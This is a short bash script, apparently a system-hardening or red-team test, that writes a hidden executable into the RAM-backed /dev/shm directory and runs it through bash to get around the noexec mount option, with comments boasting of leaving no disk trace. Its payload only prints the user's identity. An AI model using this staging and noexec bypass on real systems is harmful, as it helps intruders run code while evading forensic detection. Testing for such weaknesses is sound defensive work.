#!/bin/bash
# BREAK: Stage and execute payload from /dev/shm
# Executes from RAM — minimal disk forensic trace

echo "[CHECK] /dev/shm mount options:"
mount | grep shm

# Drop hidden payload
cat > /dev/shm/.hidden_payload << 'EOF'
#!/bin/bash
echo "[PWNED] executing from RAM — no disk trace"
id
whoami
EOF
chmod +x /dev/shm/.hidden_payload

echo "[BREAK] payload staged:"
ls -la /dev/shm/

# Execute via interpreter to bypass noexec
echo "[BREAK] executing via bash to bypass noexec:"
bash /dev/shm/.hidden_payload
